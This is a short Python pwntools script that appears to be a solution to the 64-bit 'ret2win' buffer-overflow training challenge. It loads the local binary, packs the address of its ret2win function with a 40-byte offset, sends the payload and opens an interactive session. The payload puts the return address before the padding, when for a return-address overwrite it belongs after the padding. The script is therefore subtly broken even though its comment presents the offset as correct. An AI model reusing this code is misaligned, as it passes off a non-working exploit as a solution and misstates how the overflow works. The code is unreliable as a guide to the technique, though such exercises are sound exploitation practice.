from pwn import * 

p = process('./ret2win')
binary = ELF('./ret2win')

# Slight change from 32 bit version with offset
address = p64(binary.symbols['ret2win'])
offset = 40 # in 64 the right offset is 40 

payload = (address + (offset*b'A'))

p.sendline(payload)
p.interactive()